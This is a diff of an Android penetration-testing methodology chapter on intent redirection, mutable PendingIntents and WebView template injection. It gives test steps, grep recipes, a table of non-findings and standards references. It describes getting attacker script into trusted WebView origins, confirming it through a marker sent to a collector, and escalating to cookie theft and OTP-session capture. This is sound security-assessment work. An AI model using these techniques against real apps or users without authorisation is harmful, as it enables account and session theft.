+| **Record** | logs/D08-070.txt; screenshots/D08-070-1.png |
+
+- **Skip when:** `grep -rlE 'loadDataWithBaseURL|\.loadData\(' "$DEC/jadx/sources" | grep -vE '^(android|androidx)/'` is empty → notes: "no in-code HTML templates".
+- **Test:** An extra (an id, a title, a locale) is spliced into an HTML/JS template and loaded with a
+  first-party base URL; the extra is attacker-controlled through the exported activity or the deep-link
+  router (a D08-001 row), so the attacker's script runs in the trusted origin. Distinct from a deep-link
+  `url=` reaching `loadUrl` (D10-023/025): the WebView chapter owns the origin, this row owns the delivery.
+- **How:** `grep -rn -B12 'loadDataWithBaseURL' "$DEC/jadx/sources" | grep -nE 'getStringExtra|getQueryParameter|getIntent\(\)|StringBuilder|\+ *"'`;
+  from the stub put a marker-bearing HTML-breaking string (D08-063 marker rules) in the extra and watch
+  whether it is rendered inert or executed.
+- **Proof:** The marker arriving at your collector from the trusted origin (or `document.domain` showing the
+  base host), with the D08-063 baseline check.
+- **Escalation:** → D10 (bridge methods, cookie theft); → D09 when a deep-link parameter feeds the extra
+  (AM-02).
+- **Ruled out when:** Every spliced value is HTML/JS-escaped or the base URL is `null`/`about:blank`/an
+  opaque origin with no cookies and no bridge — confirmed by the payload being rendered inert, not by
+  reading the template.
+
 ## Graveyard for this domain
 
 | Observation | Why it is not a finding | What would make it one |
 |---|---|---|
-| "Exported activity forwards an Intent" with no reached component that the caller could not reach directly | The VRT node is `broken_access_control.exposed_sensitive_android_intent`, **priority null** — it is rated on what it exposes, and this exposes nothing new | Land it on a component that is `exported="false"`, or on one whose extras drive an action (D08-007), or attach grant flags (D08-010) |
+| "Exported activity forwards an Intent" with no reached component that the caller could not reach directly | The VRT node is `broken_access_control.exposed_sensitive_android_intent`, **priority *varies*** — it is rated on what it exposes, and this exposes nothing new | Land it on a component that is `exported="false"`, or on one whose extras drive an action (D08-007), or attach grant flags (D08-010) |
 | A `StrictMode` `UnsafeIntentLaunchViolation` in logcat | A detector firing is a pointer, not an exploit; on its own it is Low and most programmes take it as informational | Weaponise the exact frame it names — the violation then belongs in the report as corroboration, never as the finding (D08-002) |
 | `FLAG_MUTABLE` present in the code | Mutability is mandatory for direct reply and legitimate in several APIs; the flag alone says nothing | The base Intent has no `ComponentName`, **or** the named component consumes `getData()`/`getExtras()` from the delivered intent, **and** you can show an acquisition path (D08-037, -038, -044) |
 | A mutable PendingIntent that never leaves the process, or is only handed to `AlarmManager` | No acquisition path — a token you cannot obtain is not a capability | Show it on a notification, a widget, a slice, an AIDL return or an Intent extra, and demonstrate the acquisition (D08-040, -045, -046, -047) |
-| PendingIntent records read out of `adb shell dumpsys activity intents` | `dumpsys` needs shell or root; AM-12 is not an attack | Obtain the same token from an app UID — a notification listener, a widget host, or an exported component that hands it out |
+| PendingIntent records read out of `adb -s "$SERIAL" shell dumpsys activity intents` | `dumpsys` needs shell or root; AM-12 is not an attack | Obtain the same token from an app UID — a notification listener, a widget host, or an exported component that hands it out |
 | A redirect proved only with `adb shell am start` | `shell` is uid 2000 and holds privileges no installed app has; the finding has not established AM-03 | Re-prove from a zero-permission attacker APK and commit its manifest (D08-064) |
 | A nested-Intent PoC that fails on Android 16 | That is the platform mitigation, not an application fix — and it is the vendor's favourite way to close the report | Run both API levels (D08-004), report it as an application bug with the platform mitigation noted; if the app calls `removeLaunchSecurityProtection()` it is a finding at full severity on every version (D08-019) |
 | The app crashes when you send a malformed nested Intent or an unexpected Parcelable type | `application_level_denial_of_service_dos.app_crash.malformed_android_intents` = **P5**, and it is a self-inflicted local crash | The crash is persistent (crash-on-launch, D04/D19), or the `BadParcelableException` is evidence of a type instantiated before the check, which you then turn into the mismatch finding (D08-028, -029) |
 | `grantUriPermissions="true"` on a `FileProvider` | Mandatory for the class — without it the provider throws | The path scope is over-broad (D07), or a redirector issues a grant to your UID (D08-010 → -012) |
+| An exported component calls `send()` / `startIntentSender*()` on a `PendingIntent`/`IntentSender` the **caller** supplied | Two halves, both needed: (1) `PendingIntent.send()` executes with the CREATOR's identity, so when the attacker supplied the token the app's UID is never borrowed; (2) when the app calls `send()` with no fill-in Intent, the caller cannot add data, flags, extras or a grant either. Nothing crosses the sandbox | The app passes its own `ActivityOptions` BAL opt-in or has a visible window while the attacker does not — then the only asset donated is the app's background-activity-launch privilege (D08-067); or the app fills in ITS OWN data/extras before sending (then it is D08-030/047 in reverse: read the fill-in) |
 | `getCreatorPackage()` appearing in the code | Defensive logging and telemetry use it legitimately | The value reaches an `if` that gates a privileged action (D08-041) — read the branch, not the call |
 | `Intent.parseUri` on a string the app itself built (an internal round-trip, `toUri()` then `parseUri()`) | Not attacker-controlled; it is a serialisation convenience | The string reaches `parseUri` from a deep link, a WebView URL, a push payload, a QR code or an extra (D08-022 → -026) |
 | `IntentSanitizer` present, strict allow-list, `sanitizeByThrowing` | The documented mitigation, correctly applied | `allowAnyComponent()`, `allowHistoryStackFlags()`, or the log-and-continue `sanitize(intent, logger)` form (D08-018) |
@@ -2803,12 +3007,13 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   app's own providers. Aim instead at the **system** provider the victim has permission for
   (`content://com.android.contacts/data`) and the echo or the grant re-delegates a dangerous permission you
   never requested (D08-034). The manifest's permission list is a menu of what the confused deputy can fetch.
-- **D08 × D05/D13 — the exported receiver on the OTP screen.** D05 tests exported receivers for injection;
-  D13 tests OTP flows for brute force. Neither tests the GMS SMS User Consent receiver as an
-  *arbitrary-Intent-launch gadget* that exists **only while the OTP screen is up** — which is also the
-  moment the app's private storage holds the freshest session material (D08-061). The BAL precondition on
-  API 34+ makes it "captures on the next login", not "unconditional"; say that yourself before the triager
-  does.
+- **D08 × D05/D13 — the exported receiver on the OTP screen.** D05-050 tests the receiver's registration
+  (no `SEND_PERMISSION`) and D13-049 the OTP injection; D08-061 is where the same receiver becomes the
+  *arbitrary-Intent-launch gadget* and self-grant chain that exists **only while the OTP screen is up** —
+  which is also the moment the app's private storage holds the freshest session material. Settle D05-050
+  first and reuse its stub for D08-061; one receiver, one stub, three rows. The background-launch
+  precondition (API 29+) makes it "captures on the next login", not "unconditional"; say that yourself
+  before the triager does.
 - **D08 × D15 — where the redirect lands is often an older API surface.** An internal route reached through
   a forwarder or an internal WebView frequently calls a backend version the current web client no longer
   uses, with weaker authorisation and more field exposure. Diff the two **behaviourally**, not by response
@@ -2865,8 +3070,8 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
   `mastg-android-pendingintent-mutable` (the flag-value list `0`, `134217728`, `33554432`, `0x08000000`,
   `0x02000000`) and `mastg-android-fileprovider-broad-scope`; MASWE-0032 (CWE-927, CWE-940), MASWE-0050
   (CWE-20, CWE-345), MASWE-0029; MASVS-PLATFORM-1, MASVS-CODE-4. Identifiers cross-checked against
-  `data/mastg-android-tests.csv`, `-techniques.csv`, `-rules.csv`.
-- **Bugcrowd VRT release 2026-07-08** (`data/bugcrowd-vrt-full.csv`, 581 entries) — in particular
+  `data/standards-index.csv` (`data/mastg-tests.csv`, `data/mastg-techniques.csv`, `data/mastg-rules.csv`).
+- **Bugcrowd VRT release 2026-07-08** (`data/vrt.csv`, 581 entries) — in particular
   `broken_access_control.exposed_sensitive_android_intent` carrying `priority: null` with an all-zero CVSS
   v3 vector, which is why every item in this chapter is written to argue its own priority, and the P5
   pinning of the whole mobile branch.
@@ -2905,7 +3110,7 @@ Decision rules (record all six numbers in `logs/D08-probe.txt` with the commands
 - **MITRE ATT&CK Mobile** — T1626 Abuse Elevation Control Mechanism (detection DET0642), T1635 / T1635.001
   Steal Application Access Token / URI Hijacking, T1624.001 Broadcast Receivers, T1409 Stored Application
   Data, T1533 Data from Local System, T1517 Access Notifications; verified against
-  `data/mitre-attack-mobile-android.csv`.
+  `data/attack-mobile-android.csv`.
 - **Tooling, read at source** — drozer (`app.activity.start`, `app.provider.info`'s
   `Grant Uri Permissions:` field, the verified flag map `GRANT_READ_URI_PERMISSION 0x1` /
   `GRANT_WRITE_URI_PERMISSION 0x2`, the `parcelable` extra type and the
